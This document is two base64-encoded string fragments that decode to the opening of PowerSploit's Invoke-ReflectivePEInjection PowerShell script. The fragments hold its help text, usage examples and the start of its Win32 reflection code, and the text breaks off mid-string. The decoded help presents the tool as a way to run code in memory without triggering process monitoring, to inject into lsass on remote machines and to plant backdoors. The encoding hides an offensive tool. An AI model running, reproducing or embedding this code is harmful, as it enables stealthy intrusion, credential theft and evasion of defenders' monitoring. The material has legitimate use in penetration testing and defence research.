		"ZnVuY3Rpb24gSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbgp7CjwjCi5TWU5PUFNJUwoKVGhpcyBzY3JpcHQgaGFzIHR3byBtb2Rlcy4gSXQgY2FuIHJlZmxlY3RpdmVseSBsb2FkIGEgRExML0VYRSBpbiB0byB0aGUgUG93ZXJTaGVsbCBwcm9jZXNzLCAKb3IgaXQgY2FuIHJlZmxlY3RpdmVseSBsb2FkIGEgRExMIGluIHRvIGEgcmVtb3RlIHByb2Nlc3MuIFRoZXNlIG1vZGVzIGhhdmUgZGlmZmVyZW50IHBhcmFtZXRlcnMgYW5kIGNvbnN0cmFpbnRzLCAKcGxlYXNlIGxlYWQgdGhlIE5vdGVzIHNlY3Rpb24gKEdFTkVSQUwgTk9URVMpIGZvciBpbmZvcm1hdGlvbiBvbiBob3cgdG8gdXNlIHRoZW0uCgoxLilSZWZsZWN0aXZlbHkgbG9hZHMgYSBETEwgb3IgRVhFIGluIHRvIG1lbW9yeSBvZiB0aGUgUG93ZXJzaGVsbCBwcm9jZXNzLgpCZWNhdXNlIHRoZSBETEwvRVhFIGlzIGxvYWRlZCByZWZsZWN0aXZlbHksIGl0IGlzIG5vdCBkaXNwbGF5ZWQgd2hlbiB0b29scyBhcmUgdXNlZCB0byBsaXN0IHRoZSBETExzIG9mIGEgcnVubmluZyBwcm9jZXNzLgoKVGhpcyB0b29sIGNhbiBiZSBydW4gb24gcmVtb3RlIHNlcnZlcnMgYnkgc3VwcGx5aW5nIGEgbG9jYWwgV2luZG93cyBQRSBmaWxlIChETEwvRVhFKSB0byBsb2FkIGluIHRvIG1lbW9yeSBvbiB0aGUgcmVtb3RlIHN5c3RlbSwKdGhpcyB3aWxsIGxvYWQgYW5kIGV4ZWN1dGUgdGhlIERMTC9FWEUgaW4gdG8gbWVtb3J5IHdpdGhvdXQgd3JpdGluZyBhbnkgZmlsZXMgdG8gZGlzay4KCjIuKSBSZWZsZWN0aXZlbHkgbG9hZCBhIERMTCBpbiB0byBtZW1vcnkgb2YgYSByZW1vdGUgcHJvY2Vzcy4KQXMgbWVudGlvbmVkIGFib3ZlLCB0aGUgRExMIGJlaW5nIHJlZmxlY3RpdmVseSBsb2FkZWQgd29uJ3QgYmUgZGlzcGxheWVkIHdoZW4gdG9vbHMgYXJlIHVzZWQgdG8gbGlzdCBETExzIG9mIHRoZSBydW5uaW5nIHJlbW90ZSBwcm9jZXNzLgoKVGhpcyBpcyBwcm9iYWJseSBtb3N0IHVzZWZ1bCBmb3IgaW5qZWN0aW5nIGJhY2tkb29ycyBpbiBTWVNURU0gcHJvY2Vzc2VzIGluIFNlc3Npb24wLiBDdXJyZW50bHksIHlvdSBjYW5ub3QgcmV0cmlldmUgb3V0cHV0CmZyb20gdGhlIERMTC4gVGhlIHNjcmlwdCBkb2Vzbid0IHdhaXQgZm9yIHRoZSBETEwgdG8gY29tcGxldGUgZXhlY3V0aW9uLCBhbmQgZG9lc24ndCBtYWtlIGFueSBlZmZvcnQgdG8gY2xlYW51cCBtZW1vcnkgaW4gdGhlIApyZW1vdGUgcHJvY2Vzcy4gCgpQb3dlclNwbG9pdCBGdW5jdGlvbjogSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbgpBdXRob3I6IEpvZSBCaWFsZWssIFR3aXR0ZXI6IEBKb3NlcGhCaWFsZWsKQ29kZSByZXZpZXcgYW5kIG1vZGlmaWNhdGlvbnM6IE1hdHQgR3JhZWJlciwgVHdpdHRlcjogQG1hdHRpZmVzdGF0aW9uCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCgouREVTQ1JJUFRJT04KClJlZmxlY3RpdmVseSBsb2FkcyBhIFdpbmRvd3MgUEUgZmlsZSAoRExML0VYRSkgaW4gdG8gdGhlIHBvd2Vyc2hlbGwgcHJvY2Vzcywgb3IgcmVmbGVjdGl2ZWx5IGluamVjdHMgYSBETEwgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4KCi5QQVJBTUVURVIgUEVCeXRlcwoKQSBieXRlIGFycmF5IGNvbnRhaW5pbmcgYSBETEwvRVhFIHRvIGxvYWQgYW5kIGV4ZWN1dGUuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKT3B0aW9uYWwsIGFuIGFycmF5IG9mIGNvbXB1dGVybmFtZXMgdG8gcnVuIHRoZSBzY3JpcHQgb24uCgouUEFSQU1FVEVSIEZ1bmNSZXR1cm5UeXBlCgpPcHRpb25hbCwgdGhlIHJldHVybiB0eXBlIG9mIHRoZSBmdW5jdGlvbiBiZWluZyBjYWxsZWQgaW4gdGhlIERMTC4gRGVmYXVsdDogVm9pZAoJT3B0aW9uczogU3RyaW5nLCBXU3RyaW5nLCBWb2lkLiBTZWUgbm90ZXMgZm9yIG1vcmUgaW5mb3JtYXRpb24uCglJTVBPUlRBTlQ6IEZvciBETExzIGJlaW5nIGxvYWRlZCByZW1vdGVseSwgb25seSBWb2lkIGlzIHN1cHBvcnRlZC4KCQouUEFSQU1FVEVSIEV4ZUFyZ3MKCk9wdGlvbmFsLCBhcmd1bWVudHMgdG8gcGFzcyB0byB0aGUgZXhlY3V0YWJsZSBiZWluZyByZWZsZWN0aXZlbHkgbG9hZGVkLgoJCi5QQVJBTUVURVIgUHJvY05hbWUKCk9wdGlvbmFsLCB0aGUgbmFtZSBvZiB0aGUgcmVtb3RlIHByb2Nlc3MgdG8gaW5qZWN0IHRoZSBETEwgaW4gdG8uIElmIG5vdCBpbmplY3RpbmcgaW4gdG8gcmVtb3RlIHByb2Nlc3MsIGlnbm9yZSB0aGlzLgoKLlBBUkFNRVRFUiBQcm9jSWQKCk9wdGlvbmFsLCB0aGUgcHJvY2VzcyBJRCBvZiB0aGUgcmVtb3RlIHByb2Nlc3MgdG8gaW5qZWN0IHRoZSBETEwgaW4gdG8uIElmIG5vdCBpbmplY3RpbmcgaW4gdG8gcmVtb3RlIHByb2Nlc3MsIGlnbm9yZSB0aGlzLgoKLlBBUkFNRVRFUiBGb3JjZUFTTFIKCk9wdGlvbmFsLCB3aWxsIGZvcmNlIHRoZSB1c2Ugb2YgQVNMUiBvbiB0aGUgUEUgYmVpbmcgbG9hZGVkIGV2ZW4gaWYgdGhlIFBFIGluZGljYXRlcyBpdCBkb2Vzbid0IHN1cHBvcnQgQVNMUi4gU29tZSBQRSdzIHdpbGwgd29yayB3aXRoIEFTTFIgZXZlbgogICAgaWYgdGhlIGNvbXBpbGVyIGZsYWdzIGRvbid0IGluZGljYXRlIHRoZXkgc3VwcG9ydCBpdC4gT3RoZXIgUEUncyB3aWxsIHNpbXBseSBjcmFzaC4gTWFrZSBzdXJlIHRvIHRlc3QgdGhpcyBwcmlvciB0byB1c2luZy4gSGFzIG5vIGVmZmVjdCB3aGVuCiAgICBsb2FkaW5nIGluIHRvIGEgcmVtb3RlIHByb2Nlc3MuCgouUEFSQU1FVEVSIERvTm90WmVyb01aCgpPcHRpb25hbCwgd2lsbCBub3Qgd2lwZSB0aGUgTVogZnJvbSB0aGUgZmlyc3QgdHdvIGJ5dGVzIG9mIHRoZSBQRS4gVGhpcyBpcyB0byBiZSB1c2VkIHByaW1hcmlseSBmb3IgdGVzdGluZyBwdXJwb3NlcyBhbmQgdG8gZW5hYmxlIGxvYWRpbmcgdGhlIHNhbWUgUEUgd2l0aCBJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIG1vcmUgdGhhbiBvbmNlLgoJCi5FWEFNUExFCgpMb2FkIERlbW9ETEwgYW5kIHJ1biB0aGUgZXhwb3J0ZWQgZnVuY3Rpb24gV1N0cmluZ0Z1bmMgb24gVGFyZ2V0LmxvY2FsLCBwcmludCB0aGUgd2NoYXJfdCogcmV0dXJuZWQgYnkgV1N0cmluZ0Z1bmMoKS4KJFBFQnl0ZXMgPSBbSU8uRmlsZV06OlJlYWRBbGxCeXRlcygnRGVtb0RMTC5kbGwnKQpJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC1QRUJ5dGVzICRQRUJ5dGVzIC1GdW5jUmV0dXJuVHlwZSBXU3RyaW5nIC1Db21wdXRlck5hbWUgVGFyZ2V0LmxvY2FsCgouRVhBTVBMRQoKTG9hZCBEZW1vRExMIGFuZCBydW4gdGhlIGV4cG9ydGVkIGZ1bmN0aW9uIFdTdHJpbmdGdW5jIG9uIGFsbCBjb21wdXRlcnMgaW4gdGhlIGZpbGUgdGFyZ2V0bGlzdC50eHQuIFByaW50Cgl0aGUgd2NoYXJfdCogcmV0dXJuZWQgYnkgV1N0cmluZ0Z1bmMoKSBmcm9tIGFsbCB0aGUgY29tcHV0ZXJzLgokUEVCeXRlcyA9IFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCdEZW1vRExMLmRsbCcpCkludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24gLVBFQnl0ZXMgJFBFQnl0ZXMgLUZ1bmNSZXR1cm5UeXBlIFdTdHJpbmcgLUNvbXB1dGVyTmFtZSAoR2V0LUNvbnRlbnQgdGFyZ2V0bGlzdC50eHQpCgouRVhBTVBMRQoKTG9hZCBEZW1vRVhFIGFuZCBydW4gaXQgbG9jYWxseS4KJFBFQnl0ZXMgPSBbSU8uRmlsZV06OlJlYWRBbGxCeXRlcygnRGVtb0VYRS5leGUnKQpJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC1QRUJ5dGVzICRQRUJ5dGVzIC1FeGVBcmdzICJBcmcxIEFyZzIgQXJnMyBBcmc0IgoKLkVYQU1QTEUKCkxvYWQgRGVtb0VYRSBhbmQgcnVuIGl0IGxvY2FsbHkuIEZvcmNlcyBBU0xSIG9uIGZvciB0aGUgRVhFLgokUEVCeXRlcyA9IFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCdEZW1vRVhFLmV4ZScpCkludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24gLVBFQnl0ZXMgJFBFQnl0ZXMgLUV4ZUFyZ3MgIkFyZzEgQXJnMiBBcmczIEFyZzQiIC1Gb3JjZUFTTFIKCi5FWEFNUExFCgpSZWZlY3RpdmVseSBsb2FkIERlbW9ETExfUmVtb3RlUHJvY2Vzcy5kbGwgaW4gdG8gdGhlIGxzYXNzIHByb2Nlc3Mgb24gYSByZW1vdGUgY29tcHV0ZXIuCiRQRUJ5dGVzID0gW0lPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJ0RlbW9ETExfUmVtb3RlUHJvY2Vzcy5kbGwnKQpJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC1QRUJ5dGVzICRQRUJ5dGVzIC1Qcm9jTmFtZSBsc2FzcyAtQ29tcHV0ZXJOYW1lIFRhcmdldC5Mb2NhbAoKLk5PVEVTCkdFTkVSQUwgTk9URVM6ClRoZSBzY3JpcHQgaGFzIDMgYmFzaWMgc2V0cyBvZiBmdW5jdGlvbmFsaXR5OgoxLikgUmVmbGVjdGl2ZWx5IGxvYWQgYSBETEwgaW4gdG8gdGhlIFBvd2VyU2hlbGwgcHJvY2VzcwoJLUNhbiByZXR1cm4gRExMIG91dHB1dCB0byB1c2VyIHdoZW4gcnVuIHJlbW90ZWx5IG9yIGxvY2FsbHkuCgktQ2xlYW5zIHVwIG1lbW9yeSBpbiB0aGUgUFMgcHJvY2VzcyBvbmNlIHRoZSBETEwgZmluaXNoZXMgZXhlY3V0aW5nLgoJLUdyZWF0IGZvciBydW5uaW5nIHBlbnRlc3QgdG9vbHMgb24gcmVtb3RlIGNvbXB1dGVycyB3aXRob3V0IHRyaWdnZXJpbmcgcHJvY2VzcyBtb25pdG9yaW5nIGFsZXJ0cy4KCS1CeSBkZWZhdWx0LCB0YWtlcyAzIGZ1bmN0aW9uIG5hbWVzLCBzZWUgYmVsb3cgKERMTCBMT0FESU5HIE5PVEVTKSBmb3IgbW9yZSBpbmZvLgoyLikgUmVmbGVjdGl2ZWx5IGxvYWQgYW4gRVhFIGluIHRvIHRoZSBQb3dlclNoZWxsIHByb2Nlc3MuCgktQ2FuIE5PVCByZXR1cm4gRVhFIG91dHB1dCB0byB1c2VyIHdoZW4gcnVuIHJlbW90ZWx5LiBJZiByZW1vdGUgb3V0cHV0IGlzIG5lZWRlZCwgeW91IG11c3QgdXNlIGEgRExMLiBDQU4gcmV0dXJuIEVYRSBvdXRwdXQgaWYgcnVuIGxvY2FsbHkuCgktQ2xlYW5zIHVwIG1lbW9yeSBpbiB0aGUgUFMgcHJvY2VzcyBvbmNlIHRoZSBETEwgZmluaXNoZXMgZXhlY3V0aW5nLgoJLUdyZWF0IGZvciBydW5uaW5nIGV4aXN0aW5nIHBlbnRlc3QgdG9vbHMgd2hpY2ggYXJlIEVYRSdzIHdpdGhvdXQgdHJpZ2dlcmluZyBwcm9jZXNzIG1vbml0b3JpbmcgYWxlcnRzLgozLikgUmVmbGVjdGl2ZWx5IGluamVjdCBhIERMTCBpbiB0byBhIHJlbW90ZSBwcm9jZXNzLgoJLUNhbiBOT1QgcmV0dXJuIERMTCBvdXRwdXQgdG8gdGhlIHVzZXIgd2hlbiBydW4gcmVtb3RlbHkgT1IgbG9jYWxseS4KCS1Eb2VzIE5PVCBjbGVhbiB1cCBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIGlmL3doZW4gRExMIGZpbmlzaGVzIGV4ZWN1dGlvbi4KCS1HcmVhdCBmb3IgcGxhbnRpbmcgYmFja2Rvb3Igb24gYSBzeXN0ZW0gYnkgaW5qZWN0aW5nIGJhY2tkb29yIERMTCBpbiB0byBhbm90aGVyIHByb2Nlc3NlcyBtZW1vcnkuCgktRXhwZWN0cyB0aGUgRExMIHRvIGhhdmUgdGhpcyBmdW5jdGlvbjogdm9pZCBWb2lkRnVuYygpLiBUaGlzIGlzIHRoZSBmdW5jdGlvbiB0aGF0IHdpbGwgYmUgY2FsbGVkIGFmdGVyIHRoZSBETEwgaXMgbG9hZGVkLgoKRExMIExPQURJTkcgTk9URVM6CgpQb3dlclNoZWxsIGRvZXMgbm90IGNhcHR1cmUgYW4gYXBwbGljYXRpb25zIG91dHB1dCBpZiBpdCBpcyBvdXRwdXQgdXNpbmcgc3Rkb3V0LCB3aGljaCBpcyBob3cgV2luZG93cyBjb25zb2xlIGFwcHMgb3V0cHV0LgpJZiB5b3UgbmVlZCB0byBnZXQgYmFjayB0aGUgb3V0cHV0IGZyb20gdGhlIFBFIGZpbGUgeW91IGFyZSBsb2FkaW5nIG9uIHJlbW90ZSBjb21wdXRlcnMsIHlvdSBtdXN0IGNvbXBpbGUgdGhlIFBFIGZpbGUgYXMgYSBETEwsIGFuZCBoYXZlIHRoZSBETEwKcmV0dXJuIGEgY2hhciogb3Igd2NoYXJfdCosIHdoaWNoIFBvd2VyU2hlbGwgY2FuIHRha2UgYW5kIHJlYWQgdGhlIG91dHB1dCBmcm9tLiBBbnl0aGluZyBvdXRwdXQgZnJvbSBzdGRvdXQgd2hpY2ggaXMgcnVuIHVzaW5nIHBvd2Vyc2hlbGwKcmVtb3Rpbmcgd2lsbCBub3QgYmUgcmV0dXJuZWQgdG8geW91LiBJZiB5b3UganVzdCBydW4gdGhlIFBvd2VyU2hlbGwgc2NyaXB0IGxvY2FsbHksIHlvdSBXSUxMIGJlIGFibGUgdG8gc2VlIHRoZSBzdGRvdXQgb3V0cHV0IGZyb20KYXBwbGljYXRpb25zIGJlY2F1c2UgaXQgd2lsbCBqdXN0IGFwcGVhciBpbiB0aGUgY29uc29sZSB3aW5kb3cuIFRoZSBsaW1pdGF0aW9uIG9ubHkgYXBwbGllcyB3aGVuIHVzaW5nIFBvd2VyU2hl",
		"bGwgcmVtb3RpbmcuCgpGb3IgRExMIExvYWRpbmc6Ck9uY2UgdGhpcyBzY3JpcHQgbG9hZHMgdGhlIERMTCwgaXQgY2FsbHMgYSBmdW5jdGlvbiBpbiB0aGUgRExMLiBUaGVyZSBpcyBhIHNlY3Rpb24gbmVhciB0aGUgYm90dG9tIGxhYmVsZWQgIllPVVIgQ09ERSBHT0VTIEhFUkUiCkkgcmVjb21tZW5kIHlvdXIgRExMIHRha2Ugbm8gcGFyYW1ldGVycy4gSSBoYXZlIHByZXdyaXR0ZW4gY29kZSB0byBoYW5kbGUgZnVuY3Rpb25zIHdoaWNoIHRha2Ugbm8gcGFyYW1ldGVycyBhcmUgcmV0dXJuCnRoZSBmb2xsb3dpbmcgdHlwZXM6IGNoYXIqLCB3Y2hhcl90KiwgYW5kIHZvaWQuIElmIHRoZSBmdW5jdGlvbiByZXR1cm5zIGNoYXIqIG9yIHdjaGFyX3QqIHRoZSBzY3JpcHQgd2lsbCBvdXRwdXQgdGhlCnJldHVybmVkIGRhdGEuIFRoZSBGdW5jUmV0dXJuVHlwZSBwYXJhbWV0ZXIgY2FuIGJlIHVzZWQgdG8gc3BlY2lmeSB3aGljaCByZXR1cm4gdHlwZSB0byB1c2UuIFRoZSBtYXBwaW5nIGlzIGFzIGZvbGxvd3M6CndjaGFyX3QqICAgOiBGdW5jUmV0dXJuVHlwZSA9IFdTdHJpbmcKY2hhciogICAgICA6IEZ1bmNSZXR1cm5UeXBlID0gU3RyaW5nCnZvaWQgICAgICAgOiBEZWZhdWx0LCBkb24ndCBzdXBwbHkgYSBGdW5jUmV0dXJuVHlwZQoKRm9yIHRoZSB3aGNhcl90KiBhbmQgY2hhcl90KiBvcHRpb25zIHRvIHdvcmssIHlvdSBtdXN0IGFsbG9jYXRlIHRoZSBzdHJpbmcgdG8gdGhlIGhlYXAuIERvbid0IHNpbXBseSBjb252ZXJ0IGEgc3RyaW5nCnVzaW5nIHN0cmluZy5jX3N0cigpIGJlY2F1c2UgaXQgd2lsbCBiZSBhbGxvY2FlZCBvbiB0aGUgc3RhY2sgYW5kIGJlIGRlc3Ryb3llZCB3aGVuIHRoZSBETEwgcmV0dXJucy4KClRoZSBmdW5jdGlvbiBuYW1lIGV4cGVjdGVkIGluIHRoZSBETEwgZm9yIHRoZSBwcmV3cml0dGVuIEZ1bmNSZXR1cm5UeXBlJ3MgaXMgYXMgZm9sbG93czoKV1N0cmluZyAgICA6IFdTdHJpbmdGdW5jClN0cmluZyAgICAgOiBTdHJpbmdGdW5jClZvaWQgICAgICAgOiBWb2lkRnVuYwoKVGhlc2UgZnVuY3Rpb24gbmFtZXMgQVJFIGNhc2Ugc2Vuc2l0aXZlLiBUbyBjcmVhdGUgYW4gZXhwb3J0ZWQgRExMIGZ1bmN0aW9uIGZvciB0aGUgd3N0cmluZyB0eXBlLCB0aGUgZnVuY3Rpb24gd291bGQKYmUgZGVjbGFyZWQgYXMgZm9sbG93czoKZXh0ZXJuICJDIiBfX2RlY2xzcGVjKCBkbGxleHBvcnQgKSB3Y2hhcl90KiBXU3RyaW5nRnVuYygpCgoKSWYgeW91IHdhbnQgdG8gdXNlIGEgRExMIHdoaWNoIHJldHVybnMgYSBkaWZmZXJlbnQgZGF0YSB0eXBlLCBvciB3aGljaCB0YWtlcyBwYXJhbWV0ZXJzLCB5b3Ugd2lsbCBuZWVkIHRvIG1vZGlmeQp0aGlzIHNjcmlwdCB0byBhY2NvbW9kYXRlIHRoaXMuIFlvdSBjYW4gZmluZCB0aGUgY29kZSB0byBtb2RpZnkgaW4gdGhlIHNlY3Rpb24gbGFiZWxlZCAiWU9VUiBDT0RFIEdPRVMgSEVSRSIuCgpGaW5kIGEgRGVtb0RMTCBhdDogaHR0cHM6Ly9naXRodWIuY29tL2NseW1iM3IvUG93ZXJTaGVsbC90cmVlL21hc3Rlci9JbnZva2UtUmVmbGVjdGl2ZURsbEluamVjdGlvbgoKLkxJTksKCmh0dHA6Ly9jbHltYjNyLndvcmRwcmVzcy5jb20vMjAxMy8wNC8wNi9yZWZsZWN0aXZlLWRsbC1pbmplY3Rpb24td2l0aC1wb3dlcnNoZWxsLwoKQmxvZyBvbiBtb2RpZnlpbmcgbWltaWthdHogZm9yIHJlZmxlY3RpdmUgbG9hZGluZzogaHR0cDovL2NseW1iM3Iud29yZHByZXNzLmNvbS8yMDEzLzA0LzA5L21vZGlmeWluZy1taW1pa2F0ei10by1iZS1sb2FkZWQtdXNpbmctaW52b2tlLXJlZmxlY3RpdmVkbGxpbmplY3Rpb24tcHMxLwpCbG9nIG9uIHVzaW5nIHRoaXMgc2NyaXB0IGFzIGEgYmFja2Rvb3Igd2l0aCBTUUwgc2VydmVyOiBodHRwOi8vd3d3LmNhc2FiYS5jb20vYmxvZy8KIz4KCltDbWRsZXRCaW5kaW5nKCldClBhcmFtKAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbQnl0ZVtdXQogICAgJFBFQnl0ZXMsCgkKCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0KCVtTdHJpbmdbXV0KCSRDb21wdXRlck5hbWUsCgkKCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyKV0KICAgIFtWYWxpZGF0ZVNldCggJ1dTdHJpbmcnLCAnU3RyaW5nJywgJ1ZvaWQnICldCglbU3RyaW5nXQoJJEZ1bmNSZXR1cm5UeXBlID0gJ1ZvaWQnLAoJCglbUGFyYW1ldGVyKFBvc2l0aW9uID0gMyldCglbU3RyaW5nXQoJJEV4ZUFyZ3MsCgkKCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0KV0KCVtJbnQzMl0KCSRQcm9jSWQsCgkKCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSA1KV0KCVtTdHJpbmddCgkkUHJvY05hbWUsCgogICAgW1N3aXRjaF0KICAgICRGb3JjZUFTTFIsCgoJW1N3aXRjaF0KCSREb05vdFplcm9NWgopCgpTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiAyCgoKJFJlbW90ZVNjcmlwdEJsb2NrID0gewoJW0NtZGxldEJpbmRpbmcoKV0KCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0J5dGVbXV0KCQkkUEVCeXRlcywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTdHJpbmddCgkJJEZ1bmNSZXR1cm5UeXBlLAoJCQkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50MzJdCgkJJFByb2NJZCwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTdHJpbmddCgkJJFByb2NOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtCb29sXQogICAgICAgICRGb3JjZUFTTFIKCSkKCQoJIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCSMjIyMjIyMjIyMgIFdpbjMyIFN0dWZmICAjIyMjIyMjIyMjCgkjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoJRnVuY3Rpb24gR2V0LVdpbjMyVHlwZXMKCXsKCQkkV2luMzJUeXBlcyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAoKCQkjRGVmaW5lIGFsbCB0aGUgc3RydWN0dXJlcy9lbnVtcyB0aGF0IHdpbGwgYmUgdXNlZAoJCSMJVGhpcyBhcnRpY2xlIHNob3dzIHlvdSBob3cgdG8gZG8gdGhpcyB3aXRoIHJlZmxlY3Rpb246IGh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tLzIwMTIvMDcvc3RydWN0cy1hbmQtZW51bXMtdXNpbmctcmVmbGVjdGlvbi5odG1sCgkJJERvbWFpbiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluCgkJJER5bmFtaWNBc3NlbWJseSA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdEeW5hbWljQXNzZW1ibHknKQoJCSRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluYW1pY0Fzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCgkJJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0R5bmFtaWNNb2R1bGUnLCAkZmFsc2UpCgkJJENvbnN0cnVjdG9ySW5mbyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbEFzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcnMoKVswXQoKCgkJIyMjIyMjIyMjIyMjICAgIEVOVU0gICAgIyMjIyMjIyMjIyMjCgkJI0VudW0gTWFjaGluZVR5cGUKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVFbnVtKCdNYWNoaW5lVHlwZScsICdQdWJsaWMnLCBbVUludDE2XSkKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnTmF0aXZlJywgW1VJbnQxNl0gMCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJMzg2JywgW1VJbnQxNl0gMHgwMTRjKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0l0YW5pdW0nLCBbVUludDE2XSAweDAyMDApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgneDY0JywgW1VJbnQxNl0gMHg4NjY0KSB8IE91dC1OdWxsCgkJJE1hY2hpbmVUeXBlID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTWFjaGluZVR5cGUgLVZhbHVlICRNYWNoaW5lVHlwZQoKCQkjRW51bSBNYWdpY1R5cGUKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVFbnVtKCdNYWdpY1R5cGUnLCAnUHVibGljJywgW1VJbnQxNl0pCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX05UX09QVElPTkFMX0hEUjMyX01BR0lDJywgW1VJbnQxNl0gMHgxMGIpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfTlRfT1BUSU9OQUxfSERSNjRfTUFHSUMnLCBbVUludDE2XSAweDIwYikgfCBPdXQtTnVsbAoJCSRNYWdpY1R5cGUgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNYWdpY1R5cGUgLVZhbHVlICRNYWdpY1R5cGUKCgkJI0VudW0gU3ViU3lzdGVtVHlwZQoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZUVudW0oJ1N1YlN5c3RlbVR5cGUnLCAnUHVibGljJywgW1VJbnQxNl0pCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9VTktOT1dOJywgW1VJbnQxNl0gMCkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fTkFUSVZFJywgW1VJbnQxNl0gMSkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fV0lORE9XU19HVUknLCBbVUludDE2XSAyKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ0lNQUdFX1NVQlNZU1RFTV9XSU5ET1dTX0NVSScsIFtVSW50MTZdIDMpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1BPU0lYX0NVSScsIFtVSW50MTZdIDcpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX1dJTkRPV1NfQ0VfR1VJJywgW1VJbnQxNl0gOSkgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJTUFHRV9TVUJTWVNURU1fRUZJX0FQUExJQ0FUSU9OJywgW1VJbnQxNl0gMTApIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX0VGSV9CT09UX1NFUlZJQ0VfRFJJVkVSJywgW1VJbnQxNl0gMTEpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSU1BR0VfU1VCU1lTVEVNX0VGSV9SVU5USU1FX0RSSVZFUicsIFtVSW50MT